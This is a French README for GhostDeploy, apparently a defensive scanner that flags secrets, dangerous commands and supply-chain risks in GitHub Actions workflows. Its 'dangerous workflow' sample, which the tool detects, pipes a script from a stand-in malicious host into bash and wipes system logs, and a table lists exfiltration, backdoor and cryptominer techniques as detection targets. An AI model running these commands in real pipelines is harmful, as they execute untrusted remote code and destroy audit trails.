# GhostDeploy

# 👻 GhostDeploy - DevSecOps Security Analyzer

```
╔══════════════════════════════════════════════════════════════════╗
║  ░██████╗░██╗░░██╗░█████╗░░██████╗████████╗                      ║
║  ██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝                      ║
║  ██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░                      ║
║  ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░                      ║
║  ╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░                      ║
║  ░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░                      ║
║                                                                  ║
║  ██████╗░███████╗██████╗░██╗░░░░░░█████╗░██╗░░░██╗               ║
║  ██╔══██╗██╔════╝██╔══██╗██║░░░░░██╔══██╗╚██╗░██╔╝               ║
║  ██║░░██║█████╗░░██████╔╝██║░░░░░██║░░██║░╚████╔╝░               ║
║  ██║░░██║██╔══╝░░██╔═══╝░██║░░░░░██║░░██║░░╚██╔╝░░               ║
║  ██████╔╝███████╗██║░░░░░███████╗╚█████╔╝░░░██║░░░               ║
║  ╚═════╝░╚══════╝╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░               ║
║                                                                  ║
║                👻 DevSecOps Security Analyzer 👻                ║
╚══════════════════════════════════════════════════════════════════╝
```

**GhostDeploy** est un analyseur de sécurité avancé pour les workflows CI/CD GitHub Actions. Il détecte automatiquement les vulnérabilités, patterns malveillants et configurations dangereuses dans vos pipelines DevSecOps.

> 🎯 **Version Stable v1.0** - Outil professionnel prêt pour la production

## ✅ Fonctionnalités Implémentées

### 🔍 **Analyse de Sécurité Avancée**
- ✅ **Détection de secrets** : 15+ patterns (AWS, Google, OpenAI, JWT, clés SSH)
- ✅ **Commandes système dangereuses** : rm -rf, chmod 777, mount, etc.
- ✅ **Patterns malveillants avancés** : 100+ règles sur 10 catégories
- ✅ **Actions GitHub tierces** : Détection supply chain attacks
- ✅ **Analyse réseau** : IPs publiques, domaines suspects, TLD dangereux
- ✅ **Vulnérabilités logicielles** : Intégration NVD/Vulners en temps réel

### 📊 **Rapports Multi-formats Complets**
- ✅ **Console interactive** : Tableaux colorés avec Rich
- ✅ **Export CSV** : Basique et avancé avec métadonnées
- ✅ **Export PDF professionnel** : Pages formatées, graphiques, résumé exécutif  
- ✅ **Export Excel** : Formatage conditionnel par sévérité
- ✅ **Dashboard HTML** : Interface web responsive avec CSS moderne

### 🎯 **Intelligence des Menaces**
- ✅ **Base CVE/CWE** : Recherche automatique via APIs NVD et Vulners
- ✅ **Scoring CVSS** : Classification automatique des vulnérabilités
- ✅ **10 catégories d'analyse** : Système, réseau, secrets, containers, CI/CD
- ✅ **Recommandations contextuelles** : Conseils de correction par anomalie

## 🚧 Fonctionnalités Futures

### 📅 **Version 2.0 (2025)**
- 📅 Interface web complète avec authentification
- 📅 API REST pour intégrations externes
- 📅 Support Kubernetes et analyse de manifests
- 📅 Analyse en temps réel sur webhooks GitHub

### 📅 **Version 3.0 (2026)**  
- 📅 Machine Learning pour nouveaux patterns
- 📅 Détection zero-day et analyse comportementale
- 📅 Intégrations cloud natives (AWS/Azure/GCP)
- 📅 Notifications Slack/Teams/JIRA automatiques

## 🚀 Installation

### Prérequis
- Python 3.8+
- pip

### Installation Rapide
```bash
# Cloner le repository
git clone https://github.com/HITOUBEN/GhostDeploy.git
cd GhostDeploy

# Installer les dépendances
pip install pyyaml colorama tabulate rich reportlab xlsxwriter requests
```

### Installation avec Environnement Virtuel (Recommandé)
```bash
# Créer et activer l'environnement virtuel
python -m venv venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate     # Windows

# Installer les dépendances
pip install pyyaml colorama tabulate rich reportlab xlsxwriter requests
```

## 💻 Utilisation

### Analyse Basique
```bash
# Analyser un workflow
python src/main.py workflow.yml

# Analyse avec choix interactif de génération de rapports
python src/main.py .github/workflows/ci.yml
```

### Export de Rapports Spécifiques
```bash
# Export CSV structuré
python src/main.py workflow.yml --csv security_report.csv

# Rapport PDF professionnel
python src/main.py workflow.yml --pdf security_report.pdf

# Dashboard HTML interactif
python src/main.py workflow.yml --html security_dashboard.html

# Analyse Excel avec graphiques
python src/main.py workflow.yml --excel security_analysis.xlsx
```

### Export Automatique
```bash
# Tous les formats avec timestamp
python src/main.py workflow.yml --all-formats

# Export automatique dans le répertoire courant
python src/main.py workflow.yml --auto-export
```

## 📋 Exemple de Sortie

### 🎯 **Sortie Console Interactive**
```
🔍 Analyse de Sécurité - Résumé
┌─────────────┬───────────────────────────────────┬────────────────┐
│ 🔴 CRITIQUE │ Secrets et Credentials Avancés    │ AWS Access Key │
│             │                                   │ exposure       │
├─────────────┼───────────────────────────────────┼────────────────┤
│ 🟠 ÉLEVÉ    │ Commandes Système Dangereuses     │ rm -rf command │
│             │                                   │ detected       │
├─────────────┼───────────────────────────────────┼────────────────┤
│ 🟡 MOYEN    │ Actions Supply Chain              │ Unversioned    │
│             │                                   │ third-party    │
└─────────────┴───────────────────────────────────┴────────────────┘

📊 Statistiques Globales:
• Total anomalies: 23
• Critiques: 3
• Élevées: 12  
• Moyennes: 8
• Score de sécurité: 67/100 (BON)
```

## 🔧 Structure du Projet

```
GhostDeploy/
├── src/
│   ├── main.py                    # ✅ Point d'entrée avec interface CLI
│   ├── report_generator.py        # ✅ Exports PDF/CSV/Excel/HTML
│   └── threat_intel/
│       ├── __init__.py           # ✅ Module Python
│       └── vulners.py            # ✅ APIs CVE/NVD/Vulners
├── requirements.txt               # 📅 En cours de finalisation
├── README.md                      # ✅ Cette documentation
└── examples/                      # 📅 Workflows d'exemple à ajouter
```

## 🛡️ Catégories de Détection

GhostDeploy analyse **10 catégories principales** :

| Catégorie | Patterns | Sévérité | Exemples |
|-----------|----------|----------|----------|
| **Secrets & Credentials** | 15+ | CRITIQUE | AWS keys, JWT, SSH keys |
| **Commandes Système** | 12+ | ÉLEVÉ | rm -rf, chmod 777, mount |
| **Exfiltration Données** | 8+ | CRITIQUE | tar + curl, database dumps |
| **Backdoors** | 10+ | CRITIQUE | crontab, authorized_keys |
| **Reconnaissance** | 8+ | ÉLEVÉ | nmap, nikto, searchsploit |
| **Supply Chain** | 5+ | MOYEN | Actions non versionnées |
| **Containers** | 12+ | ÉLEVÉ | docker --privileged |
| **Réseau Suspect** | 20+ | MOYEN | IPs publiques, TLD suspects |
| **Cryptominage** | 15+ | CRITIQUE | xmrig, mining pools |
| **CI/CD Attacks** | 10+ | ÉLEVÉ | Configs non sécurisées |

## 🎨 Formats de Rapport

### 📊 **Dashboard HTML**
Interface web responsive avec :
- Statistiques visuelles par cartes
- Tableaux interactifs colorés par sévérité
- Design moderne CSS professionnel

### 📄 **Rapport PDF Professionnel**
- Page de couverture avec résumé exécutif
- Graphiques en secteurs par sévérité
- Tables détaillées groupées par criticité
- Recommandations contextuelles

### 📈 **Export Excel Avancé**
- Formatage conditionnel automatique
- Feuilles séparées par catégorie
- Formules de calcul des scores

## 🛡️ Niveaux de Sécurité

| Niveau | Icône | Score Impact | Action Requise |
|--------|-------|--------------|----------------|
| **CRITIQUE** | 🔴 | -25 points | Correction immédiate |
| **ÉLEVÉ** | 🟠 | -15 points | Correction prioritaire |
| **MOYEN** | 🟡 | -8 points | Correction recommandée |
| **FAIBLE** | 🟢 | -3 points | Amélioration optionnelle |

## 📚 Exemples de Workflows

### Workflow Sécurisé ✅
```yaml
name: Secure CI/CD
on: [push, pull_request]
jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      - name: Install dependencies
        run: npm ci
      - name: Run security tests
        run: npm audit
```

### Workflow Dangereux ⚠️ (Détecté par GhostDeploy)
```yaml
name: Dangerous Workflow
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Download and execute script
        run: |
          curl http://malicious-site.com/script.sh | bash    # 🔴 CRITIQUE
          chmod 777 /tmp                                     # 🟠 ÉLEVÉ
          rm -rf /var/log/*                                  # 🟠 ÉLEVÉ
      - uses: untrusted-action@main                          # 🟡 MOYEN
```

## 🤝 Contribution

Les contributions sont bienvenues ! Le projet suit les standards de développement professionnel.

### Comment Contribuer
1. **Fork** le projet sur GitHub
2. **Créer** une branche feature (`git checkout -b feature/NewDetection`)
3. **Développer** avec tests appropriés
4. **Commit** avec messages descriptifs (`git commit -m 'Add: Detection for Log4Shell'`)
5. **Push** vers votre fork (`git push origin feature/NewDetection`)
6. **Créer** une Pull Request détaillée

### Zones d'Amélioration Prioritaires
- 🔍 Nouveaux patterns de détection de vulnérabilités
- 📊 Améliorations des rapports et visualisations
- 🧪 Tests unitaires et d'intégration
- 📚 Documentation technique et exemples
- 🌐 Traductions et internationalisation

## 🆘 Support et Ressources

- **Repository** : [https://github.com/HITOUBEN/GhostDeploy](https://github.com/HITOUBEN/GhostDeploy)
- **Issues** : [Signaler un Bug](https://github.com/HITOUBEN/GhostDeploy/issues)
- **Discussions** : [Forum Communauté](https://github.com/HITOUBEN/GhostDeploy/discussions)
- **Wiki** : [Documentation Technique](https://github.com/HITOUBEN/GhostDeploy/wiki) *(En cours de création)*

## 📊 Métriques du Projet

- **Patterns de sécurité** : 100+ règles actives
- **APIs intégrées** : NVD, Vulners, CVE Details
- **Formats d'export** : 4 formats complets
- **Langages détectés** : 10+ (Node.js, Python, Java, Docker...)
- **Couverture CVE** : Temps réel via APIs officielles

## 👥 Équipe

- **Ahmed (HITOUBEN)** - *Développeur Principal* - [@HITOUBEN](https://github.com/HITOUBEN)

## 📄 Licence

Distribué sous licence MIT. Consultez le fichier `LICENSE` pour plus d'informations.


---

## 🚀 Démarrage Rapide

```bash
# Installation et premier test
git clone https://github.com/HITOUBEN/GhostDeploy.git
cd GhostDeploy

# Installer les dépendances
pip install pyyaml colorama tabulate rich reportlab xlsxwriter requests

# Analyser un workflow avec rapports automatiques
python src/main.py your-workflow.yml --auto-export

# Résultat: Rapports générés dans le répertoire courant
# ✅ workflow_security_report_YYYYMMDD_HHMMSS.csv
# ✅ workflow_security_report_YYYYMMDD_HHMMSS.pdf  
# ✅ workflow_security_dashboard_YYYYMMDD_HHMMSS.html
```

---

**⭐ Star le projet si GhostDeploy sécurise efficacement vos workflows CI/CD !**

**🎯 Production Ready - Déployez en toute confiance avec GhostDeploy v1.0**
